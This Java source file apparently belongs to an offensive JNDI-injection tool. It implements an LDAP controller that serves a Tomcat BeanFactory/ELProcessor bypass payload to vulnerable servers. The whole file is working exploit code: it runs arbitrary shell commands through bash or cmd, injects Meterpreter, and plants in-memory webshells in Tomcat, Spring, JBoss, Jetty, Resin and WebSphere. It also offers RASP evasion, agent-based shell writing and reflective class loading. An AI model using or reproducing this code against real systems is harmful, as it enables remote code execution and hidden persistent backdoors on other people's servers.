package com.nu1r.jndi.controllers;

import com.nu1r.jndi.enumtypes.GadgetType;
import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.exceptions.IncorrectParamsException;
import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
import com.nu1r.jndi.gadgets.utils.InjShell;
import com.nu1r.jndi.template.Agent.WinMenshell;
import com.nu1r.jndi.template.Meterpreter;
import com.nu1r.jndi.template.SpringEchoTemplate;
import com.nu1r.jndi.template.TomcatEchoTemplate;
import com.nu1r.jndi.template.Websphere.WSFMSFromThread;
import com.nu1r.jndi.template.isSuccess;
import com.nu1r.jndi.template.jboss.JBFMSFromContextF;
import com.nu1r.jndi.template.jboss.JBSMSFromContextS;
import com.nu1r.jndi.template.jetty.JFMSFromJMXF;
import com.nu1r.jndi.template.jetty.JSMSFromJMXS;
import com.nu1r.jndi.template.resin.RFMSFromThreadF;
import com.nu1r.jndi.template.resin.RSMSFromThreadS;
import com.nu1r.jndi.template.spring.SpringInterceptorMS;
import com.nu1r.jndi.template.spring.SpringMemshellTemplate;
import com.nu1r.jndi.template.tomcat.*;
import com.nu1r.jndi.gadgets.Config.Config;
import com.nu1r.jndi.gadgets.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.binary.Base64;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

import java.io.IOException;

import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
import static com.nu1r.jndi.gadgets.utils.InjShell.TinsertLinAgent;
import static com.nu1r.jndi.gadgets.utils.InjShell.TinsertWinAgent;
import static com.nu1r.jndi.gadgets.Config.Config.*;
import static org.fusesource.jansi.Ansi.ansi;


@LdapMapping(uri = {"/tomcatbypass"})
public class TomcatBypassController implements LdapController {
    private PayloadType payloadType;
    private String[]    params;
    private GadgetType  gadgetType;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        try {
            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base + " @|MAGENTA with javax.el.ELProcessor payload|@"));
            Entry e = new Entry(base);
            e.addAttribute("javaClassName", "java.lang.String"); //could be any
            //准备在 org.apache.naming.factory.BeanFactory 中利用不安全反射的负载
            //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "x=eval"));

            TomcatBypassHelper helper = new TomcatBypassHelper();
            String             code   = null;


            //具体分化在这里
            switch (payloadType) {
                case nu1r:
                    code = helper.getExecCode(params[0]);
                    break;
                case tomcatecho:
                    code = helper.injectTomcatEcho();
                    break;
                case springecho:
                    code = helper.injectSpringEcho();
                    break;
                case issuccess:
                    code = helper.injectSuccess();
                    break;
                case meterpreter:
                    code = helper.injectMeterpreter();
                    break;
                case tomcatfilterjmx:
                    code = helper.injectTomcatFilterJmx();
                    break;
                case tomcatfilterth:
                    code = helper.injectTomcatFilterTh();
                    break;
                case tomcatlistenerjmx:
                    code = helper.injectTomcatListenerJmx();
                    break;
                case tomcatlistenerth:
                    code = helper.injectTomcatListenerTh();
                    break;
                case tomcatservletjmx:
                    code = helper.injectTomcatServletJmx();
                    break;
                case tomcatservletth:
                    code = helper.injectTomcatServletTh();
                    break;
                case jbossfilter:
                    code = helper.injectJBossFilter();
                    break;
                case jbossservlet:
                    code = helper.injectJBossServlet();
                    break;
                case springinterceptor:
                    code = helper.injectSpringInterceptor();
                    break;
                case wsfilter:
                    code = helper.injectWSFilter();
                    break;
                case jettyfilter:
                    code = helper.injectJettyFilter();
                    break;
                case jettyservlet:
                    code = helper.injectJettyServlet();
                    break;
                case tomcatexecutor:
                    code = helper.injectTomcatExecutor();
                    break;
                case resinfilterth:
                    code = helper.injectResinFilterTh();
                    break;
                case resinservletth:
                    code = helper.injectResinServletTh();
                    break;
                case tomcatupgrade:
                    code = helper.injectTomcatUpgrade();
                    break;
            }

            String payloadTemplate = "{" +
                    "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                    ".newInstance().getEngineByName(\"JavaScript\")" +
                    ".eval(\"{replacement}\")" +
                    "}";
            String finalPayload = payloadTemplate.replace("{replacement}", code);
            ref.add(new StringRefAddr("x", finalPayload));
            e.addAttribute("javaSerializedData", Util.serialize(ref));

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            System.out.println();
        }catch (Throwable er){
            System.err.println("Error while generating or serializing payload");
            er.printStackTrace();
        }
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try {
            int fistIndex   = base.indexOf("/");
            int secondIndex = base.indexOf("/", fistIndex + 1);
            if (secondIndex < 0) secondIndex = base.length();

            try {
                payloadType = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA PaylaodType >> |@" + payloadType));
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(fistIndex + 1, secondIndex));
            }

            int thirdIndex = base.indexOf("/", secondIndex + 1);
            if (thirdIndex != -1) {
                if (thirdIndex < 0) thirdIndex = base.length();
                try {
                    gadgetType = GadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                } catch (IllegalArgumentException e) {
                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
                }
            }

            if (gadgetType == GadgetType.shell) {
                String url1    = Util.getCmdFromBase(base);
                int    result1 = url1.indexOf("-");
                if (result1 != -1) {
                    String[] U = url1.split("-");
                    int      i = U.length;
                    if (i >= 1) {
                        URL_PATTERN = U[0];
                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA shellUrl >> |@" + U[0]));
                    }
                    if (i >= 2) {
                        Shell_Type = U[1];
                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA shellType >> |@" + U[1]));
                    }
                    if (url1.contains("obscure")) {
                        IS_OBSCURE = true;
                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用反射绕过RASP |@"));
                    }
                    if (url1.contains("winAgent")) {
                        winAgent = true;
                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Windows下使用Agent写入 |@"));
                    }
                    if (url1.contains("linAgent")) {
                        linAgent = true;
                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Linux下使用Agent写入 |@"));
                    }
                } else {
                    URL_PATTERN = url1;
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellUrl >> |@" + url1));
                }
            }

            if (gadgetType == GadgetType.Base64) {
                String cmd = Util.getCmdFromBase(base);
                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
                params = new String[]{cmd};
            }
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }

    private class TomcatBypassHelper {

        public String getExecCode(String cmd) throws IOException {

            String code = "var strs=new Array(3);\n" +
                    "        if(java.io.File.separator.equals('/')){\n" +
                    "            strs[0]='/bin/bash';\n" +
                    "            strs[1]='-c';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }else{\n" +
                    "            strs[0]='cmd';\n" +
                    "            strs[1]='/C';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }\n" +
                    "        java.lang.Runtime.getRuntime().exec(strs);";

            return code;
        }

        public String injectTomcatEcho() {
            return injectClass(TomcatEchoTemplate.class);
        }

        public String injectSpringEcho() {
            return injectClass(SpringEchoTemplate.class);
        }

        public String injectSuccess() {
            return injectClass(isSuccess.class);
        }

        //        public String injectMeterpreter(){return injectClass(Meterpreter.class);}
        public String injectMeterpreter() {
            System.out.println("------------------------");
            return injectClass(Meterpreter.class);
        }

        public String injectTomcatFilterJmx() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(TFJMX.class));
            CtClass ctClass = pool.get(TFJMX.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            ctClass.writeFile();
            return injectClass(ctClass.getClass());
        }

        public String injectTomcatFilterTh() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(TFMSFromThreadF.class));
            CtClass ctClass = pool.get(TFMSFromThreadF.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            return injectClass(ctClass.getClass());
        }

        public String injectTomcatListenerJmx() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(TLMSFromJMXLi.class));
            CtClass ctClass = pool.get(TLMSFromJMXLi.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            return injectClass(ctClass.getClass());
        }

        public String injectTomcatListenerTh() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(TLMSFromThreadLi.class));
            CtClass ctClass = pool.get(TLMSFromThreadLi.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            return injectClass(ctClass.getClass());
        }

        public String injectTomcatServletJmx() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(TSMSFromJMXS.class));
            CtClass ctClass = pool.get(TSMSFromJMXS.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            return injectClass(ctClass.getClass());
        }

        public String injectTomcatServletTh() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(TSMSFromThreadS.class));
            CtClass ctClass = pool.get(TSMSFromThreadS.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            return injectClass(ctClass.getClass());
        }

        public String injectJBossFilter() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(JBFMSFromContextF.class));
            CtClass ctClass = pool.get(JBFMSFromContextF.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            return injectClass(ctClass.getClass());
        }

        public String injectJBossServlet() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(JBSMSFromContextS.class));
            CtClass ctClass = pool.get(JBSMSFromContextS.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            return injectClass(ctClass.getClass());
        }

        public String injectJettyFilter() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(JFMSFromJMXF.class));
            CtClass ctClass = pool.get(JFMSFromJMXF.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            return injectClass(ctClass.getClass());
        }

        public String injectJettyServlet() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(JSMSFromJMXS.class));
            CtClass ctClass = pool.get(JSMSFromJMXS.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            return injectClass(ctClass.getClass());
        }

        public String injectWSFilter() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(WSFMSFromThread.class));
            CtClass ctClass = pool.get(WSFMSFromThread.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "ws");
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            return injectClass(ctClass.getClass());
        }

        public String injectTomcatExecutor() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(TWSMSFromThread.class));
            CtClass ctClass = pool.get(TWSMSFromThread.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "execute");
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            return injectClass(ctClass.getClass());
        }

        public String injectSpringInterceptor() throws Exception {
            Config.init();
            byte[]    classBytes;
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(SpringInterceptorMS.class));
            CtClass ctClass = pool.get(SpringInterceptorMS.class.getName());
            String  target  = "com.nu1r.jndi.template.spring.SpringMemshellTemplate";
            pool.insertClassPath(new ClassClassPath(SpringMemshellTemplate.class));
            CtClass springTemplateClass = pool.get(target);
            // 类名后加时间戳
            String clazzName = target + System.nanoTime();
            springTemplateClass.setName(clazzName);
            String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
            // 修改b64字节码
            String b64content = "b64=\"" + encode + "\";";
            ctClass.makeClassInitializer().insertBefore(b64content);
            // 修改 SpringInterceptorMemShell 随机命名 防止二次打不进去
            String clazzNameContent = "clazzName=\"" + clazzName + "\";";
            ctClass.makeClassInitializer().insertBefore(clazzNameContent);
            ctClass.setName(SpringInterceptorMS.class.getName() + System.nanoTime());
            classBytes = ctClass.toBytecode();
            clazzName = SpringInterceptorMS.class.getName() + System.nanoTime();
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            return injectShell(classBytes, clazzName);
        }

        public String injectResinFilterTh() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(RFMSFromThreadF.class));
            CtClass ctClass = pool.get(RFMSFromThreadF.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            return injectClass(ctClass.getClass());
        }

        public String injectResinServletTh() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(RSMSFromThreadS.class));
            CtClass ctClass = pool.get(RSMSFromThreadS.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            return injectClass(ctClass.getClass());
        }

        public String injectTomcatUpgrade() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(TUGMSFromJMXuP.class));
            CtClass ctClass = pool.get(TUGMSFromJMXuP.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "upgrade");
            ctClass.setName(generateClassName());
            if (winAgent) {
                TinsertWinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            if (linAgent) {
                TinsertLinAgent(ctClass);
                return injectClass(WinMenshell.class);
            }
            return injectClass(ctClass.getClass());
        }

        //类加载方式，因类而异
        public String injectClass(Class clazz) {

            String classCode = null;
            try {
                //获取base64后的类
                classCode = Util.getClassCode(clazz);

            } catch (Exception e) {
                e.printStackTrace();
            }

            return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                    "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                    "try{\n" +
                    "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
                    "   clazz.newInstance();\n" +
                    "}catch(err){\n" +
                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                    "   method.setAccessible(true);\n" +
                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                    "   clazz.newInstance();\n" +
                    "};";
        }

        public String injectShell(byte[] classBytes, String clazzName) {

            String classCode = null;
            try {
                //获取base64后的类
                classCode = Util.getClassType(classBytes);

            } catch (Exception e) {
                e.printStackTrace();
            }

            return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                    "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                    "try{\n" +
                    "   var clazz = classLoader.loadClass('" + clazzName + "');\n" +
                    "   clazz.newInstance();\n" +
                    "}catch(err){\n" +
                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                    "   method.setAccessible(true);\n" +
                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                    "   clazz.newInstance();\n" +
                    "};";
        }

    }
}